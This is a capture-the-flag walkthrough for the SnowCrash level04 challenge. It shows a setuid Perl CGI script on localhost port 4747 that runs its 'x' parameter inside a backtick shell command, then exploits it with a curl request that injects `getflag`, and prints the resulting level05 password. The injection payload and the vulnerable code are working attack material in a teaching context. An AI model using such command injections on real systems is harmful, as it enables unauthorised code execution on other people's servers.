# level04 - Hack Perl

## Home

- `level04` home contains a perl script named `level04.pl` that belongs to `flag04`.
- The script is SETUID and SETGID. It will be executed with `flag04` permissions.

```console
level04@SnowCrash:~$ ls -al
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```

## `level04.pl`

- The file seems to be a cgi script running on localhost, port 4747.
- It echo the request parameter named `x`.

```console
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
level04@SnowCrash:~$
```

## Apache On Port 4747

- A service is effectively running on port 4747 under a `TCPv6` protocol.

```console
level04@SnowCrash:~$ netstat -lt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 *:4242                  *:*                     LISTEN
tcp        0      0 localhost:pcrd          *:*                     LISTEN
tcp6       0      0 [::]:4646               [::]:*                  LISTEN
tcp6       0      0 [::]:4747               [::]:*                  LISTEN
tcp6       0      0 [::]:http               [::]:*                  LISTEN
tcp6       0      0 [::]:4242               [::]:*                  LISTEN
```

- The service is `Apache2.2.22`.

```console
level04@SnowCrash:~$ curl "localhost:4747/badway"

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /badway was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at localhost Port 4747</address>
</body></html>
level04@SnowCrash:~$ curl "localhost:4747/whoareyou"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /whoareyou was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at localhost Port 4747</address>
</body></html>
```

```console
level04@SnowCrash:~$ ls /etc/apache2/sites-enabled/
000-default  level05.conf  level12.conf
level04@SnowCrash:~$ cat /etc/apache2/sites-enabled/level05.conf
<VirtualHost *:4747>
	DocumentRoot	/var/www/level04/
	SuexecUserGroup flag04 level04
	<Directory /var/www/level04>
		Options +ExecCGI
		DirectoryIndex level04.pl
		AllowOverride None
		Order allow,deny
		Allow from all
		AddHandler cgi-script .pl
	</Directory>
</VirtualHost>
```

> Notice that there is also an Apache configuration file for level12.

## `getflag` over IP

- As the parameter `x` is injected in a shell command executed as `flag04`, we can try a command injection to execute the `getflag` program:

``level04@SnowCrash:~$ curl 'localhost:4747?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap``

# Flag

- level05 password (flag): `ne2searoevaevoem4ov4ar8ap`

<p align="center"><a href="../level03/level03.md"><= Previous</a>&ensp;&ensp;&ensp;&ensp;<a href="../level05/level05.md">Next =></a></p>
